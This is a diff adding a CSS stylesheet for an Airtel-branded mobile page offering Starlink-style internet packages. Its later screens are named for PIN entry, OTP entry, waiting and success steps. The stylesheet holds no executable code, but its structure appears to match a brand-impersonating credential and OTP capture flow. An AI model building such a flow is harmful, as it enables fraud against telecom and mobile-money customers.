@@ -1,0 +1,476 @@
+* {
+  box-sizing: border-box;
+}
+
+:root {
+  --airtel-red: #d7192b;
+  --airtel-dark: #870711;
+  --airtel-deep: #6f050c;
+  --airtel-orange: #f47b20;
+  --white: #ffffff;
+  --text: #171717;
+  --muted: #666666;
+}
+
+body {
+  margin: 0;
+  min-height: 100vh;
+  font-family: Arial, Helvetica, sans-serif;
+  color: var(--text);
+  background: #850711;
+}
+
+.app {
+  width: 100%;
+  min-height: 100vh;
+  margin: 0;
+  padding: 0;
+}
+
+.page {
+  display: none;
+}
+
+.page.active {
+  display: block;
+}
+
+/* ===== SCREENSHOT-STYLE FIRST PAGE ===== */
+#packagePage {
+  min-height: 100vh;
+  background: linear-gradient(180deg, #970914 0%, #850711 100%);
+  padding: 0 8px 10px;
+}
+
+.starlink-header {
+  position: relative;
+  min-height: 125px;
+  padding: 5px 8px 10px;
+  color: #fff;
+}
+
+.airtel-brand {
+  position: absolute;
+  left: 4px;
+  top: 3px;
+  line-height: 1;
+}
+
+.airtel-logo {
+  font-size: 13px;
+  font-weight: 900;
+  letter-spacing: -0.5px;
+}
+
+.airtel-tagline {
+  font-size: 4px;
+  margin-top: 2px;
+  opacity: .95;
+}
+
+.header-menu {
+  position: absolute;
+  right: 2px;
+  top: 3px;
+  width: 17px;
+  height: 17px;
+  border: 1px solid rgba(255,255,255,.75);
+  border-radius: 4px;
+  display: grid;
+  place-items: center;
+  font-size: 9px;
+}
+
+.header-center {
+  text-align: center;
+  padding-top: 7px;
+}
+
+.service-name {
+  font-size: 7px;
+  font-weight: 800;
+  margin-bottom: 5px;
+}
+
+.internet-pill {
+  display: inline-block;
+  border: 1px solid rgba(255,255,255,.8);
+  border-radius: 10px;
+  padding: 2px 9px;
+  font-size: 6px;
+  margin-bottom: 4px;
+}
+
+.header-center h1 {
+  margin: 0;
+  font-size: 16px;
+  line-height: .88;
+  font-weight: 900;
+}
+
+.header-center h1 span {
+  color: #fff;
+}
+
+.header-center h1 em {
+  color: #ffb21a;
+  font-style: normal;
+}
+
+.header-center p {
+  margin: 5px 0 0;
+  font-size: 5px;
+  line-height: 1.35;
+  color: #fff;
+}
+
+.plans-title {
+  display: none;
+}
+
+.packages {
+  display: grid;
+  grid-template-columns: repeat(2, minmax(0, 1fr));
+  gap: 5px;
+  width: 100%;
+  padding: 0;
+}
+
+.package {
+  position: relative;
+  width: 100%;
+  min-height: 88px;
+  padding: 8px 6px 5px;
+  border: 2px solid #f3a21a;
+  border-radius: 8px;
+  background: #fff;
+  color: #111;
+  display: flex;
+  flex-direction: column;
+  align-items: center;
+  justify-content: space-between;
+  text-align: center;
+  cursor: pointer;
+  box-shadow: 0 1px 0 rgba(0,0,0,.15);
+}
+
+.package:hover {
+  transform: none;
+  border-color: #f3a21a;
+}
+
+.package strong {
+  font-size: 14px;
+  line-height: 1;
+  color: #d7192b;
+  font-weight: 900;
+  font-style: italic;
+}
+
+.package span {
+  display: block;
+  color: #222;
+  font-size: 6px;
+  margin-top: 3px;
+}
+
+.price {
+  color: #111;
+  font-weight: 900;
+  font-size: 8px;
+  margin: 4px 0 4px;
+}
+
+.package::after {
+  content: "CHOOSE THIS PACKAGE";
+  width: 100%;
+  background: #d7192b;
+  color: #fff;
+  border-radius: 8px;
+  min-height: 17px;
+  display: flex;
+  align-items: center;
+  justify-content: center;
+  font-size: 5px;
+  font-weight: 900;
+}
+
+.package:last-child {
+  grid-column: 1 / -1;
+  min-height: 88px;
+}
+
+.site-footer {
+  margin-top: 10px;
+  min-height: 20px;
+  border: 1px solid rgba(255,255,255,.3);
+  border-radius: 6px;
+  color: #fff;
+  display: grid;
+  grid-template-columns: 1fr 12px 1fr 12px 1fr;
+  align-items: center;
+  text-align: center;
+  font-size: 5px;
+  padding: 4px 3px;
+}
+
+.copyright {
+  color: #fff;
+  text-align: center;
+  font-size: 4px;
+  margin-top: 10px;
+}
+
+/* ===== OTHER PAGES: keep the existing functionality, with Airtel styling ===== */
+.brand {
+  display: flex;
+  align-items: center;
+  gap: 14px;
+  margin: 18px 0 26px;
+}
+
+.brand.small {
+  margin-top: 8px;
+}
+
+.logo {
+  width: 58px;
+  height: 58px;
+  border-radius: 14px;
+  background: var(--airtel-red);
+  color: #fff;
+  display: grid;
+  place-items: center;
+  font-weight: 900;
+  font-size: 18px;
+  box-shadow: 0 8px 22px rgba(215, 25, 43, 0.2);
+}
+
+h1 {
+  margin: 0 0 5px;
+  font-size: 24px;
+}
+
+h2 {
+  margin-top: 0;
+}
+
+.brand p {
+  margin: 0;
+  color: var(--muted);
+}
+
+.card,
+.status-card,
+.success-card {
+  background: #fff;
+  border-radius: 18px;
+  padding: 24px;
+  box-shadow: 0 12px 35px rgba(0, 0, 0, 0.08);
+}
+
+#pinPage, #otpPage, #waitingPage, #otpWaitingPage, #successPage, #errorPage {
+  width: min(100%, 560px);
+  min-height: 100vh;
+  margin: 0 auto;
+  padding: 22px 16px 40px;
+  background: linear-gradient(135deg, #ffffff 0%, #fff2f2 100%);
+}
+
+.demo-warning {
+  border: 1px solid #d7192b;
+  background: #fff1f1;
+  color: #7f0008;
+  border-radius: 12px;
+  padding: 13px;
+  font-size: 13px;
+  line-height: 1.5;
+  margin-bottom: 18px;
+}
+
+label {
+  display: block;
+  font-weight: 700;
+  margin: 18px 0 8px;
+}
+
+label:first-of-type {
+  margin-top: 0;
+}
+
+input {
+  width: 100%;
+  border: 1px solid #d4d4d4;
+  border-radius: 12px;
+  padding: 15px;
+  font-size: 17px;
+  outline: none;
+}
+
+input:focus {
+  border-color: var(--airtel-red);
+  box-shadow: 0 0 0 3px rgba(215, 25, 43, 0.08);
+}
+
+.phone-row {
+  display: flex;
+  border: 1px solid #d4d4d4;
+  border-radius: 12px;
+  overflow: hidden;
+}
+
+.phone-row:focus-within {
+  border-color: var(--airtel-red);
+}
+
+.phone-row span {
+  display: grid;
+  place-items: center;
+  padding: 0 14px;
+  background: #f3f3f3;
+  font-weight: 700;
+}
+
+.phone-row input {
+  border: 0;
+  border-radius: 0;
+}
+
+small {
+  display: block;
+  color: var(--muted);
+  margin-top: 7px;
+}
+
+.primary,
+.secondary,
+.back {
+  border: 0;
+  border-radius: 12px;
+  font-size: 16px;
+  font-weight: 800;
+  cursor: pointer;
+}
+
+.primary {
+  width: 100%;
+  margin-top: 20px;
+  padding: 15px;
+  color: #fff;
+  background: var(--airtel-red);
+}
+
+.primary:hover {
+  background: #b90f20;
+}
+
+.primary:disabled {
+  opacity: 0.6;
+  cursor: not-allowed;
+}
+
+.secondary {
+  width: 100%;
+  margin-top: 12px;
+  padding: 15px;
+  background: #eeeeee;
+  color: #222;
+}
+
+.back {
+  background: transparent;
+  color: var(--airtel-red);
+  padding: 8px 0;
+}
+
+.error {
+  min-height: 18px;
+  color: var(--airtel-red);
+  font-size: 14px;
+  margin-top: 7px;
+}
+
+.notice {
+  color: #666;
+  font-size: 12px;
+  line-height: 1.5;
+  margin: 18px 0 0;
+}
+
+.status-card,
+.success-card {
+  margin-top: 28vh;
+  text-align: center;
+}
+
+.status-card p,
+.success-card p {
+  color: var(--muted);
+  line-height: 1.6;
+}
+
+.spinner {
+  width: 44px;
+  height: 44px;
+  margin: 0 auto 20px;
+  border: 4px solid #eee;
+  border-top-color: var(--airtel-red);
+  border-radius: 50%;
+  animation: spin 1s linear infinite;
+}
+
+.success-icon {
+  width: 68px;
+  height: 68px;
+  margin: 0 auto 16px;
+  border-radius: 50%;
+  background: #18a957;
+  color: #fff;
+  display: grid;
+  place-items: center;
+  font-size: 38px;
+  font-weight: 900;
+}
+
+.error-card {
+  border-top: 5px solid var(--airtel-red);
+}
+
+.timer-text {
+  text-align: center;
+  color: var(--muted);
+  margin-top: 16px;
+}
+
+.muted {
+  color: var(--muted);
+}
+
+.hidden {
+  display: none !important;
+}
+
+@keyframes spin {
+  to {
+    transform: rotate(360deg);
+  }
+}
+
+@media (max-width: 600px) {
+  #packagePage {
+    padding-left: 5px;
+    padding-right: 5px;
+  }
+
+  .starlink-header {
+    min-height: 122px;
+  }
+
+  .package {
+    min-height: 82px;
+  }
+
+  .package strong {
+    font-size: 13px;
+  }
+}
